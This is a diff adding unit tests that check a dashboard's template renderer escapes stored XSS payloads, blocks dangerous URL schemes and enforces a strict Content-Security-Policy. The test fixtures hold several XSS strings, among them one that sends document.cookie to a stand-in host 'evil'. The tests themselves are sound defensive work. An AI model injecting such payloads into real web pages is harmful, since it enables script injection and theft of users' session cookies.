@@ -19,6 +19,12 @@ from ares import store
 from ares.proposer import parse_proposals
 from ares.pipeline import enumerate_candidate_edges, load_events, run_incident
 from ares.scoring import score_claims, score_run
+from ares.rendering import (
+    CONTENT_SECURITY_POLICY,
+    CSP_META_TAG,
+    UnsafeTemplateConstruct,
+    render_string,
+)
 from ares.store import (
     assign_verified_badge,
     create_claim,
@@ -506,3 +512,70 @@ class TruncatedResponseSalvageTests(unittest.TestCase):
         proposals, discarded = parse_proposals("the model declined", self.ALLOWED)
         self.assertEqual(proposals, [])
         self.assertEqual(discarded, 1)
+
+
+class TemplateEscapingTests(unittest.TestCase):
+    """A stored payload must never leave a template as live markup.
+
+    Model rationales are stored in claim_text, so this is not hypothetical: the
+    proposer writes attacker-influenceable text into the database, and the
+    dashboard's whole job is to render it.
+    """
+
+    PAYLOADS = [
+        "<script>alert('xss')</script>",
+        "\"><img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "</textarea><script>fetch('http://evil/'+document.cookie)</script>",
+    ]
+
+    def test_payloads_are_escaped_in_html_output(self):
+        """The test is whether the payload can still open a tag, not whether its
+        text survives. ``onerror=`` appearing as inert body text is fine; a raw
+        ``<`` from untrusted input is what turns text into markup."""
+        for payload in self.PAYLOADS:
+            with self.subTest(payload=payload):
+                rendered = render_string("<p>{{ rationale }}</p>", rationale=payload)
+                body = rendered[len("<p>"):-len("</p>")]
+                self.assertNotIn("<", body)
+                self.assertNotIn(">", body)
+                self.assertNotIn('"', body)
+                self.assertNotIn(payload, rendered)
+
+    def test_dangerous_url_schemes_are_neutralised_in_link_context(self):
+        """Escaping does not help here - an href is a URL, not text."""
+        for hostile in [
+            "javascript:alert(1)",
+            "JaVaScRiPt:alert(1)",
+            "java\tscript:alert(1)",
+            "data:text/html;base64,PHNjcmlwdD4=",
+            "vbscript:msgbox(1)",
+        ]:
+            with self.subTest(url=hostile):
+                rendered = render_string('<a href="{{ u|url }}">x</a>', u=hostile)
+                self.assertEqual(rendered, '<a href="#">x</a>')
+
+    def test_ordinary_urls_still_work(self):
+        for benign in ["https://example.org/a", "http://example.org", "/reports/1", "mailto:a@b.c"]:
+            with self.subTest(url=benign):
+                self.assertIn(benign, render_string('<a href="{{ u|url }}">x</a>', u=benign))
+
+    def test_safe_filter_is_disabled_rather_than_merely_discouraged(self):
+        with self.assertRaises(UnsafeTemplateConstruct):
+            render_string("<p>{{ rationale|safe }}</p>", rationale="<script>x</script>")
+
+    def test_string_templates_autoescape_too(self):
+        """default_for_string=True: a template built in memory is still escaped."""
+        rendered = render_string("{{ value }}", value="<b>not bold</b>")
+        self.assertNotIn("<b>", rendered)
+
+    def test_undefined_names_fail_loudly(self):
+        from jinja2 import UndefinedError
+
+        with self.assertRaises(UndefinedError):
+            render_string("{{ never_passed }}")
+
+    def test_csp_forbids_script_entirely(self):
+        self.assertIn("default-src 'none'", CONTENT_SECURITY_POLICY)
+        self.assertNotIn("script-src", CONTENT_SECURITY_POLICY)
+        self.assertIn("Content-Security-Policy", CSP_META_TAG)
